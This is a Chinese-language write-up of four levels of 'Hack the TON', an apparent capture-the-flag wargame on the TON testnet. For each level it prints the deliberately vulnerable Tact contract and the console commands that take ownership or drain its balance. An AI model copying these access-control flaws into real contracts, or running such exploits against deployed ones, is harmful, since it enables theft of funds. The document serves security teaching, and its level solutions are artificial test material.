---
title: Hack the TON
tags:
    - blockchain
    - smart contract
    - ton
    - tact
---

## 0. INTRODUCTION

- 可以在控制台中使用 `help()` 查看可以使用的程序功能

    (index) | description
    -|-
    fromNano(nano)|"convert nano units to ton"
    toNano(ton)|"convert ton units to nano"
    contract|"current level contract instance (if created)"
    player|"current player (if wallet connected)"
    Address.parse(addressString)|"parse Address from string"
    tonConnectUI.sendTransaction(tx, options)|"send custom transaction to arbitrary address"
    beginCell()|"start building a cell"

- 在连接钱包后，点击 `GET NEW INSTANCE` 获取一个题目实例
- 与 Ethernaut 类似，可以在控制台使用 `contract` 获取信息或与合约交互

    ```js
    > await contract.getInfo() 
    ​You will find what you need in getInfo1().
    > await contract.getInfo1() 
    ​Try getInfo2(), but with 'hello' as a parameter. 
    ​> await contract.getInfo2("hello") 
    ​Try getInfoNum() to know the number of the next info method to call. 
    ​> await contract.getInfoNum() 
    ​42n​
    > await contract.getInfo42() 
    ​Send message Authenticate if you know the password.
    > await contract.getPassword() 
    ​Tact and FunC for the win!
    > await contract.send(player, {value: toNano(0.05)}, {$$type: "Authenticate", password: "Tact and FunC for the win!"});
    ```

- 完成后点击 `CHECK SOLUTION` 验证

### References

- [Send messages to contracts](https://docs.tact-lang.org/book/debug/#tests-send)

## 1. DEPOSIT

> You will beat this level if:

> - Claim ownership of the contract

> - Reduce its balance to 0

??? note "DepositLevel"

    ```js
    import "@stdlib/ownable";
    import "@stdlib/deploy";
    import "./messages";

    contract DepositLevel with Ownable, Deployable {
        owner: Address;
        player: Address;
        nonce: Int;

        init(player: Address, nonce: Int) {
            self.owner = sender();
            self.player = player;
            self.nonce = nonce;
        }

        receive() {
            require(context().value >= ton("0.01"), "Not enough TON.");
            self.owner = sender();
        }

        receive("withdraw") {
            self.requireOwner();
            send(SendParameters{
                to: sender(),
                bounce: true,
                value: 0,
                mode: SendRemainingBalance + SendIgnoreErrors
            });
        }

        receive("check") {
            let ctx: Context = context();
            send(SendParameters{
                to: ctx.sender,
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "deposit",
                    completed: (myBalance() - ctx.value) == 0 && self.owner == self.player,
                }.toCell()
            });
        }

        get fun balance(): String {
            return myBalance().toCoinsString();
        }
    }
    ```

- 只有所有者才能取出合约持有的 TON，首先向合约发送 TON 以成为所有者

    ```js
    > await player.send({to: contract.address.toString(), value: toNano("0.05")});
    // or
    > await contract.send(player, {value: toNano(0.05)}, null);
    ```

- 使用 `withdraw` 取出合约中所有的资金

    ```js
    > await contract.send(player, {value: toNano(0.05)}, "withdraw"); 
    ```

## 2. SCANNER

> Claim ownership of the contract below to complete this level.

??? note "ScannerLevel"

    ```js
    import "@stdlib/ownable";
    import "@stdlib/deploy";
    import "./messages";

    contract Child with Deployable {
        parent: Address;
        nonce: Int;

        init(parent: Address, nonce: Int) {
            self.parent = parent;
            self.nonce = nonce;
        }
    }

    message SendChildAddress {
        address: Address;
    }

    contract ScannerLevel with Ownable, Deployable {
        owner: Address;
        player: Address;
        nonce: Int;
        child: Address;

        init(player: Address, nonce: Int) {
            self.owner = sender();
            self.player = player;
            self.nonce = nonce;

            let level_init: StateInit = initOf Child(myAddress(), nonce);
            self.child = contractAddress(level_init);
            send(SendParameters{
                to: self.child,
                value: ton("0.01"),
                mode: SendPayGasSeparately,
                bounce: false,
                data: level_init.data,
                code: level_init.code,
                body: Deploy {
                    queryId: 0,
                }.toCell()
            });
        }

        receive(msg: SendChildAddress) {
            require(msg.address == self.child, "Wrong child address.");
            self.owner = sender();
        }

        receive("check") {
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "scanner",
                    completed: self.owner == self.player
                }.toCell()
            });
        }
    }
    ```

- 要成为合约的所有者需要知道 `Child` 合约的地址，可以通过 [Tonviewer](https://testnet.tonviewer.com/) 查看 `ScannerLevel` 部署的交易来获知
- 发送 `Child` 合约地址

    ```js
    > await contract.send(player, {value: toNano("0.05")}, {$$type: "SendChildAddress", address: Address.parse("kQDjT2mQ8ePcmYsBMQDi4JJHPzZNU1nqe_KbqIOwUKZaCX2Z")});
    ```

## 3. BOUNCE

> Claim ownership of the contract below to complete this level.

??? note "BounceLevel"

    ```js
    import "@stdlib/ownable";
    import "@stdlib/deploy";
    import "./messages";

    message Start {
        time: Int as uint32;
    }

    message Finish {
        time: Int as uint32;
    }

    contract Timer with Deployable {
        parent: Address;
        nonce: Int;
        startTime: Int? as uint32;

        init(parent: Address, nonce: Int) {
            self.parent = parent;
            self.nonce = nonce;
        }

        receive(msg: Start) {
            self.startTime = msg.time;
        }

        receive(msg: Finish) {
            if (self.startTime == null) {
                return;
            }

            require(msg.time - self.startTime!! < 180, "Too late.");
            self.startTime = null;
        }
    }

    contract BounceLevel with Ownable, Deployable {
        owner: Address;
        player: Address;
        nonce: Int;
        timer: Address;

        init(player: Address, nonce: Int) {
            self.owner = sender();
            self.player = player;
            self.nonce = nonce;

            let level_init: StateInit = initOf Timer(myAddress(), nonce);
            self.timer = contractAddress(level_init);
            send(SendParameters{
                to: self.timer,
                value: ton("0.01"),
                bounce: false,
                data: level_init.data,
                code: level_init.code
            });
        }

        receive("start") {
            send(SendParameters{
                to: self.timer,
                value: 0,
                bounce: true,
                mode: SendRemainingValue,
                body: Start{
                    time: now()
                }.toCell()
            });
        }

        receive("finish") {
            send(SendParameters{
                to: self.timer,
                value: 0,
                bounce: true,
                mode: SendRemainingValue,
                body: Finish{
                    time: now()
                }.toCell()
            });
        }

        bounced(_: Slice) {
            self.owner = self.player;
        }

        receive("check") {
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "bounce",
                    completed: self.owner == self.player
                }.toCell()
            });
        }
    }
    ```

- 合约 `BounceLevel` 收到弹回的消息后就会将玩家设为合约所有者
- 只需要在发送完 `start` 的三分钟后向 `BounceLevel` 发送 `finish`，让合约 `Timer` 抛出错误弹回消息即可
    - 或直接向 `Timer` 发送 `start` 设置自定义开始时间

    ```js
    > await contract.send(player, {value: toNano('0.05')}, "start");
    // or
    > await player.send({to: Address.parse("kQCmY8KG3F2y-2Unxl2jMtJMIUjT9fWhqXWM37hPHWbnPIjp"), value: toNano("0.01"), body: beginCell().storeUint(1141136470, 32).storeUint(0, 32).endCell()});
    // opcode: sha256("Start{time:uint32}") >> 224

    > await contract.send(player, {value: toNano('0.05')}, "finish"); 
    ```

### References

- [tact-lang / tact](https://github.com/tact-lang/tact/blob/ecae8d73c2cafef31c3c2ffebf1c69a5a89cb506/src/types/resolveSignatures.ts#L283-L291)

## 4. INTRUDER

> Claim ownership of the contract below to complete this level.

??? note "IntruderLevel"

    ```js
    import "@stdlib/deploy";
    import "./messages";

    message(0x6e38a063) ChangeLevelOwner {
        newOwner: Address;
    }

    message(0x6f13c225) ChangeClientOwner {
        newOwner: Address;
    }

    message(0xa4e501ef) ChangeOwnerInternal {
        newOwner: Address;
    }

    contract Manager with Deployable {
        client: Address;
        nonce: Int;

        init(client: Address, nonce: Int) {
            self.client = client;
            self.nonce = nonce;
        }

        receive(msg: ChangeClientOwner) {
            send(SendParameters{
                to: self.client,
                value: 0,
                bounce: false,
                mode: SendRemainingValue,
                body: ChangeOwnerInternal{
                    newOwner: msg.newOwner
                }.toCell()
            });
        }
    }

    contract IntruderLevel with Deployable {
        owner: Address;
        player: Address;
        nonce: Int;
        manager: Address;

        init(player: Address, nonce: Int) {
            self.owner = sender();
            self.player = player;
            self.nonce = nonce;

            let level_init: StateInit = initOf Manager(myAddress(), nonce);
            self.manager = contractAddress(level_init);
            send(SendParameters{
                to: self.manager,
                value: ton("0.01"),
                bounce: false,
                data: level_init.data,
                code: level_init.code
            });
        }

        receive(msg: ChangeLevelOwner) {
            require(sender() == self.owner, "Wrong sender.");
            send(SendParameters{
                to: self.manager,
                value: 0,
                bounce: false,
                mode: SendRemainingValue,
                body: ChangeClientOwner{
                    newOwner: msg.newOwner
                }.toCell()
            });
        }

        receive(msg: ChangeOwnerInternal) {
            require(sender() == self.manager, "Wrong sender.");
            self.owner = msg.newOwner;
        }

        receive("check") {
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "intruder",
                    completed: self.owner == self.player
                }.toCell()
            });
        }

        get fun owner(): Address {
            return self.owner;
        }
    }
    ```

- 只有 `manager` 能设置合约的所有者，而初始 `manager` 为 `Manager` 合约

    ```js
    message(0x6f13c225) ChangeClientOwner {
        newOwner: Address;
    }
    ```

- 可以向 `Manager` 合约发送 `ChangeClientOwner` 消息来设置 `IntruderLevel` 合约的所有者

    ```js
    > await player.send({to: Address.parse("kQCi5Sne638i1fdoGMK7cnKPVuQWgyGO4N4LxneLonWwvgZ_"), value: toNano("0.01"), body: beginCell().storeUint(0x6f13c225, 32).storeAddress(player.address).endCell()});
    ```
